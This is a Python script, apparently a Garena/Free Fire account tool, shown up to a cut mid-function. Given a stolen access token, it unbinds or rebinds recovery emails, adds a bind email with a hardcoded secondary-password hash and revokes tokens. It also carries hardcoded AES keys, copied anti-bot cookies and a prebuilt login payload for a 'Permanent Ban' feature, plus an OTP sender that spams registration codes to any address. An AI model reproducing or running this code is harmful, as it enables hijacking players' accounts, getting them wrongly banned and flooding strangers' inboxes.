# resubscribe_otp_sender.py
# Garena All-in-One Tool - Resubscribe OTP Sender + Ban Check

import os
import sys
import json
import time
import base64
import threading
import requests
import urllib3
import urllib.parse
import random
import string
from datetime import datetime

urllib3.disable_warnings()

# ========== CRYPTO IMPORTS ==========
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("\n[!] Installing pycryptodome...")
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

# ========== PROTOBUF SETUP ==========
try:
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except ImportError:
    print("\n[!] Installing protobuf...")
    os.system("pip install protobuf")
    from google.protobuf import descriptor as _descriptor
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()

# ========== EMBEDDED PROTOBUF ==========
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')

_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())

try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except KeyError:
    print("\n[!] Error: Failed to build protobuf classes.")
    sys.exit(1)

# ========== COLORS ==========
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[97m'
BR = '\033[1;31m'
BG = '\033[1;32m'
BY = '\033[1;33m'
BB = '\033[1;34m'
BP = '\033[1;35m'
BC = '\033[1;36m'
BW = '\033[1;37m'
M = '\033[1;95m'
S = '\033[0m'

# ========== FF BAN CONSTANTS ==========
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

# ========== UI FUNCTIONS ==========
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def hr():
    print(f"{BC}──────────────────────────────────────────────────────{S}")

def banner():
    clear()
    print(f"""
{BC}╔══════════════════════════════════════════════════════╗
║           {Y}🔥 RESUBSCRIBE OTP SENDER {BC}🔥               ║
║              {P}⚡ POWER BY RAIZZ ⚡                    ║
║           {C}👑 Developer: @Raizz_Baby28 👑             ║
╚══════════════════════════════════════════════════════╝{S}
    """)

def show_credits():
    hr()
    print(f"\n {BC}★ {W}Developer : {Y}@Raizz_Baby28 {S}")
    print(f" {BC}★ {W}Version   : {P}RAIZZ EDITION{S}")
    hr()# ========== MENU ==========
def print_menu():
    print(f"{G}[1] {W}- Recovery Email{S}")
    print(f"{C}[2] {W}- Check Recovery Email{S}")
    print(f"{Y}[3] {W}- Check Platform{S}")
    print(f"{R}[4] {W}- Cancel Recovery Email{S}")
    print(f"{P}[5] {W}- Unbind Email{S}")
    print(f"{C}[6] {W}- Change Bind Email{S}")
    print(f"{R}[7] {W}- Revoke Access Token{S}")
    print(f"{BR}[8] {W}- FF Permanent Ban{S}")
    print(f"{BR}[9] {W}- Resubscribe OTP Sender{S}")
    print(f"{BR}[10] {W}- Check Ban Status{S}")
    print(f"{BR}[0] {W}- Exit{S}")

# ========== GARENA ACCOUNT TOOL FUNCTIONS ==========
def unbind_email():
    clear()
    banner()
    print(f"{BB}----- UNBIND EMAIL -----{S}")
    print(f"{G}[1] {W}- By Email OTP{S}")
    print(f"{C}[2] {W}- By Secondary Password{S}")
    print()

    choice = input(f"{BY}Select Option{S}{W}: {S}")

    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }

    email = input(f"{B}📧 {W}Enter Linked Email{S}{W}: {S}")
    access_token = input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}")

    identity_token = None

    if choice == '1':
        print(f"\n{Y}[Step 1]{W} Sending OTP...{S}")
        send_otp_url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        send_otp_data = {
            "email": email,
            "locale": "en_MA",
            "region": "IND",
            "app_id": "100067",
            "access_token": access_token
        }
        resp = requests.post(send_otp_url, headers=headers, data=send_otp_data)
        if '"result":0' not in resp.text.replace(" ", ""):
            print(f"{R}✗ OTP Send Failed{S}")
            return
        print(f"{G}✓ OTP Sent{S}")
        otp = input(f"{B}📱 {W}Enter OTP{S}{W}: {S}")
        print(f"\n{Y}[Step 2]{W} Verifying OTP...{S}")
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "otp": otp,
            "app_id": "100067",
            "access_token": access_token
        }
        resp = requests.post(verify_url, headers=headers, data=verify_data)
        try:
            identity_token = resp.json().get("identity_token")
        except:
            pass

    elif choice == '2':
        secondary_password = input(f"{B}🔐 {W}Enter Secondary Password{S}{W}: {S}")
        print(f"\n{Y}[Step 1]{W} Verifying Secondary Password...{S}")
        verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        verify_data = {
            "email": email,
            "secondary_password": secondary_password,
            "app_id": "100067",
            "access_token": access_token
        }
        resp = requests.post(verify_url, headers=headers, data=verify_data)
        try:
            identity_token = resp.json().get("identity_token")
        except:
            pass
    else:
        print(f"{R}Invalid Option{S}")
        return

    if not identity_token:
        print(f"{R}✗ Failed to get identity_token{S}")
        return

    print(f"\n{Y}[Final Step]{W} Creating Unbind Request...{S}")
    unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
    unbind_data = {
        "app_id": "100067",
        "access_token": access_token,
        "identity_token": identity_token
    }
    resp = requests.post(unbind_url, headers=headers, data=unbind_data)
    if '"result":0' in resp.text.replace(" ", ""):
        print(f"\n{G}✓ SUCCESS: Email Unbind Request Created!{S}")
    else:
        print(f"\n{R}✗ FAILED: {resp.text}{S}")

def change_bind_email():
    clear()
    banner()
    print(f"{BB}--- CHANGE BIND EMAIL ---{S}")
    print(f"{G}[1] {W}- Verify Old Email by OTP{S}")
    print(f"{C}[2] {W}- Verify by Secondary Password{S}")
    print()

    method = input(f"{BY}Select Method{S}{W}: {S}")
    access = input(f"{B}🔑 {W}Enter Access Token{S}{W}: {S}")
    old = input(f"{B}📧 {W}Enter Old Email{S}{W}: {S}")
    new = input(f"{B}📧 {W}Enter New Email{S}{W}: {S}")

    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json"
    }
    identity_token = None

    if method == '1':
        print(f"\n{Y}[Step 1/5]{W} Sending OTP to {old}...{S}")
        url_send = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
        data = {'email': old, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': access}
        r = requests.post(url_send, headers=headers, data=data)
        print(f"{C}Response: {r.text}{S}")
        otp_old = input(f"{B}📱 {W}Enter OTP for {old}{S}{W}: {S}")
        print(f"\n{Y}[Step 2/5]{W} Verifying Identity...{S}")
        url_verify_identity = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        data_verify = {'email': old, 'app_id': '100067', 'access_token': access, 'otp': otp_old}
        r = requests.post(url_verify_identity, headers=headers, data=data_verify)
        try:
            res = r.json()
            identity_token = res.get("identity_token")
            if not identity_token:
                print(f"{R}X No identity token found.{S}")
                return
        except:
            print(f"{R}X Parse Error.{S}")
            return

    elif method == '2':
        secondary_password = input(f"{B}🔐 {W}Enter Secondary Password{S}{W}: {S}")
        print(f"\n{Y}[Step 1/5]{W} Verifying Secondary Password...{S}")
        url_verify_identity = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        data_verify = {'email': old, 'secondary_password': secondary_password, 'app_id': '100067', 'access_token': access}
        r = requests.post(url_verify_identity, headers=headers, data=data_verify)
        try:
            res = r.json()
            identity_token = res.get("identity_token")
            if not identity_token:
                print(f"{R}X No identity token found.{S}")
                return
        except:
            print(f"{R}X Parse Error.{S}")
            return
    else:
        print(f"{R}Invalid Option{S}")
        return

    print(f"\n{Y}[Step 3/5]{W} Sending OTP to {new}...{S}")
    url_send = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    data_new = {'email': new, 'locale': 'en_MA', 'region': 'IND', 'app_id': '100067', 'access_token': access}
    r = requests.post(url_send, headers=headers, data=data_new)
    print(f"{C}Response: {r.text}{S}")
    otp_new = input(f"{B}📱 {W}Enter OTP for {new}{S}{W}: {S}")
    print(f"\n{Y}[Step 4/5]{W} Verifying New OTP...{S}")
    url_verify_otp = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    data_verify_new = {'email': new, 'app_id': '100067', 'access_token': access, 'otp': otp_new}
    r = requests.post(url_verify_otp, headers=headers, data=data_verify_new)
    try:
        res = r.json()
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            print(f"{R}X No verifier token found.{S}")
            return
    except:
        print(f"{R}X Parse Error.{S}")
        return

    print(f"\n{Y}[Step 5/5]{W} Finalizing Rebind Request...{S}")
    url_rebind = "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
    data_final = {
        'identity_token': identity_token,
        'email': new,
        'app_id': '100067',
        'verifier_token': verifier_token,
        'access_token': access
    }
    r = requests.post(url_rebind, headers=headers, data=data_final)
    if '"result":0' in r.text.replace(" ", ""):
        print(f"\n{G}✓ SUCCESS: Rebind Created!{S}")
    else:
        print(f"\n{R}X FAILED: {r.text}{S}")

def CancEL(access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    PyL = {'app_id': "100067", 'access_token': access}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        print(f"{G}- Response => {RsP.json()}{S}")
    else:
        print(f"{R}- No Response !{S}")

def SEnd(email, access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    PyL = {'app_id': "100067", 'access_token': access, 'email': email, 'locale': "en_MA"}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept': "application/json", 'Accept-Encoding': "gzip", 'Cookie': "datadome=q2ZtAABCjPFEIWeaxYM2YvfxEUPXT_GLUp4gpUOEUPlI9jGXkQLS5uoG_HBUBnJvC0s0CBfHF6h4FUg7mBumLRO1jpLh4um4CbF4ykEKTLv5f27DgR_nkEJcZm_Sj1E~"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        OTp = input(f"{B}📱 {W}OTP => {S}")
        return VeriFy(OTp, email, access)
    else:
        print(f"{R}- Bad Response No OTP Get !{S}")

def VeriFy(OTp, email, access):
    UrL = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    PyL = {'app_id': "100067", 'access_token': access, 'otp': OTp, 'email': email}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        auth = RsP.json().get("verifier_token")
        print(f"{G}- Auth Access : {auth}{S}")
        return Add(auth, access, email)

def Add(auth, access, email):
    CancEL(access)
    UrL = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    PyL = {'app_id': "100067", 'access_token': access, 'verifier_token': auth, 'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203", 'email': email}
    Hr = {'User-Agent': "GarenaMSDK/4.0.19P9(infinix Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    RsP = requests.post(UrL, data=PyL, headers=Hr)
    if RsP.status_code == 200:
        print(f"{G}{RsP.json()}{S}")
        print(f"{G}- Successfully Adding : {email} To Account !{S}")

def ReVoKe(access):
    url = f"https://100067.connect.garena.com/oauth/logout?access_token={access}"
    r = requests.get(url)
    if r.text.strip() == '{"result":0}':
        print(f"{G}🎉 TOKEN REVOKED SUCCESSFULLY 🎉{S}")
    else:
        print(f"{R}Status: {r.status_code}{S}")
        print(f"{R}Response: {r.text}{S}")

def convert(s):
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    return f"{d} Day {h} Hour {m} Min {s} Sec"

def ChK(access):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    payload = {'app_id': "100067", 'access_token': access}
    headers = {'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", 'Connection': "Keep-Alive", 'Accept-Encoding': "gzip"}
    try:
        rsp = requests.get(url, params=payload, headers=headers, timeout=10)
        if rsp.status_code == 200:
            data = rsp.json()
            email = data.get("email", "")
            email_to_be = data.get("email_to_be", "")
            mobile = data.get("mobile", "")
            mobile_to_be = data.get("mobile_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            result = data.get("result", -1)
            print(f"\n{BC}{'='*50}{S}")
            print(f"{BC}   ACCOUNT RECOVERY STATUS{S}")
            print(f"{BC}{'='*50}{S}")
            if result == 0:
                print(f"{G}- Status = success{S}")
                print(f"{G}- Status_code = 200{S}")
            else:
                print(f"{R}- Status = failed{S}")
                print(f"{R}- Status_code = {result}{S}")
            if email and not email_to_be:
                print(f"{C}- summary = Email confirmed: {email}{S}")
            elif email_to_be:
                print(f"{Y}- summary = Pending confirmation: {email_to_be}{S}")
            else:
                print(f"{R}- summary = No email bound{S}")
            if countdown > 0:
                d, h = divmod(countdown, 86400)
                h, m = divmod(h, 3600)
                m, s = divmod(m, 60)
                countdown_str = f"{d}d {h}h {m}m {s}s"
                print(f"{P}- countDown_human = {countdown_str}{S}")
            else:
                print(f"{P}- countDown_human = 0d 0h 0m 0s{S}")
            print(f"{C}- countDown_seconds = {countdown}{S}")
            print(f"{G}- currentEmail = {email}{S}")
            print(f"{Y}- pendingEmail = {email_to_be}{S}")
            print(f"{C}- mobile = {mobile}{S}")
            print(f"{C}- mobileTo_be = {mobile_to_be}{S}")
            print(f"{C}- result = {result}{S}")
            if email and not email_to_be:
                print(f"\n{G}- Confirmed = YES Good !{S}")
            elif email_to_be:
                print(f"\n{Y}- Confirmed = Pending confirmation{S}")
            else:
                print(f"\n{R}- Confirmed = No email bound{S}")
            print(f"\n{BC}{'-'*50}{S}")
            print(f"{BP}- Developer = NITIN  PAPA HERE {S}")
            print(f"{BP}- Channel = IG @HARYANA_AALEE_22{S}")
            print(f"{BC}{'-'*50}{S}")
        else:
            print(f"\n{R}- Error: HTTP {rsp.status_code}{S}")
            print(f"{R}- Response: {rsp.text}{S}")
    except requests.exceptions.RequestException as e:
        print(f"\n{R}- Connection Error: {e}{S}")
    except Exception as e:
        print(f"\n{R}- Parse Error: {e}{S}")

def GeT_PLaFTroms(t):
    clear()
    banner()
    r = requests.get("https://100067.connect.garena.com/bind/app/platform/info/get",
        params={'access_token': t},
        headers={'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "If-Modified-Since": "Sun, 18 May 2025 09:37:03 GMT"})
    if r.status_code not in [200, 201]:
        return print(f"{R}Failed to fetch.{S}")
    j = r.json()
    m = {3: "Facebook", 8: "Gmail", 10: "iCloud", 5: "VK", 11: "Twitter", 7: "Huawei"}
    b, a = j.get("bounded_accounts", []), j.get("available_platforms", [])
    print(f"{BC}> Secondary Links : <{S}")
    l = False
    for x in b:
        try:
            p = x.get('platform')
            u = x.get('uid')
            uinfo = x.get('user_info', {})
            e = uinfo.get('email', '')
            n = uinfo.get('nickname', '')
            if p in m:
                print(f"\n{G}=> {m[p]} !{S}")
                if e:
                    print(f"{C}- Email : {e}{S}")
                if n:
                    print(f"{C}- Email Name : {n}{S}")
                print()
                l = True
        except:
            continue
    if not l:
        print(f"{R}=> Secondary Links Not Found !{S}")
    print(f"\n{BC}> Response : <{S}\n")
    print(f"{C}{b}{S}")
    for k in m:
        if k not in a:
            print(f"\n{G}> Main Platform => {m[k]} ! <{S}")
            break# ========== OTP SENDER FUNCTION ==========
def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def send_register_code_email(email):
    """Send registration code request to Garena."""
    url = "https://authgop.garena.com/api/send_register_code_email"
    
    headers = {
        "Host": "authgop.garena.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Linux",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://authgop.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://authgop.garena.com/universal/register?redirect_uri=https://authgop.garena.com/universal/register",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en-IN;q=0.9,en;q=0.8,hi;q=0.7,vi;q=0.6",
        "Cookie": "_ga=GA1.1.868059803.1775926376; _ga_XB5PSHEQB4=GS2.1.s1775926375$o1$g1$t1775926378$j57$l0$h0; datadome=piPnlDyb63lxNPgE~RUOGoABXAAwgxiBV8pMUCVyDvaNK_SK5uvOTRikR~zsTIAAc5En_D133T364K7yxCfNS5YjVc3AKPIKU45GRmXGgJAoBnDU~rQ1xHE4esKMwfrh"
    }
    
    username = generate_username()
    request_id = int(time.time() * 1000)
    
    data = {
        "username": username,
        "email": email,
        "locale": "en-SG",
        "format": "json",
        "id": request_id
    }
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=30)
        print(f"{C}Status: {response.status_code}{S}")
        try:
            result = response.json()
            print(f"{Y}Response: {json.dumps(result, indent=2)}{S}")
            if response.status_code == 200 and result.get("result") == 0:
                print(f"{G}✅ OTP Sent Successfully!{S}")
                print(f"{G}📧 Check your email: {email}{S}")
            else:
                print(f"{R}❌ Failed! {result}{S}")
        except:
            print(f"{W}Response: {response.text[:200]}{S}")
    except Exception as e:
        print(f"{R}Error: {e}{S}")

def resubscribe_otp_sender():
    clear()
    banner()
    print(f"{BB}📧 RESUBSCRIBE OTP SENDER{S}")
    hr()
    print(f"{W}[#] Send registration code to email.{S}\n")
    email = input(f"{C}Enter email address: {W}")
    if not email:
        print(f"{R}Email cannot be empty!{S}")
        input(f"{Y}Press Enter to continue...{S}")
        return
    send_register_code_email(email)
    input(f"\n{Y}Press Enter to continue...{S}")# ========== BAN CHECK FUNCTION ==========
def ban_check():
    """Check CrownX ban status for a given UID."""
    clear()
    banner()
    print(f"{BB}🔍 CROWNX BAN STATUS CHECKER{S}")
    hr()
    
    uid = input(f"{C}Enter UID: {W}")
    
    if not uid or not uid.isdigit():
        print(f"{R}Invalid UID! Please enter a numeric UID.{S}")
        input(f"{Y}Press Enter to continue...{S}")
        return
    
    try:
        url = f"https://crownx-premium-bancheck.vercel.app/baninfo?uid={uid}"
        print(f"{Y}Fetching ban info for UID: {uid}...{S}")
        
        response = requests.get(url, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            print(f"\n{G}[✓] Account Info Retrieved Successfully{S}")
            hr()
            print(f"{C}🆔 Account ID : {W}{data.get('account_id', 'N/A')}{S}")
            print(f"{C}👤 Nickname   : {W}{data.get('nickname', 'N/A')}{S}")
            print(f"{C}🌍 Region     : {W}{data.get('region', 'N/A')}{S}")
            print(f"{C}📊 Level      : {W}{data.get('level', 'N/A')}{S}")
            hr()
            
            ban_info = data.get('ban_info', {})
            if ban_info and ban_info.get('is_banned'):
                print(f"{R}💀 Ban Status : {W}PERMANENTLY BANNED{R}")
                print(f"{R}🕒 Start Time: {W}{ban_info.get('ban_start_time', 'N/A')}{S}")
                print(f"{R}📝 Reason    : {W}{ban_info.get('status', 'N/A')}{S}")
            else:
                print(f"{G}✅ Ban Status : {W}ACCOUNT IS CLEAN (Not Banned){S}")
                
            hr()
            show_credits()
        else:
            print(f"{R}❌ Request Failed! Status Code: {response.status_code}{S}")
            print(f"{Y}Response: {response.text[:200]}{S}")
            
    except requests.exceptions.ConnectionError:
        print(f"{R}Connection Error! Please check your internet.{S}")
    except requests.exceptions.Timeout:
        print(f"{R}Request timed out! The server took too long to respond.{S}")
    except Exception as e:
        print(f"{R}Error: {str(e)}{S}")
    
    input(f"\n{Y}Press Enter to continue...{S}")# ========== FF BAN FUNCTIONS ==========
def run_with_loader(func, text="PROCESSING"):
    result_data = {"result": None, "error": None}
    def worker():
        try:
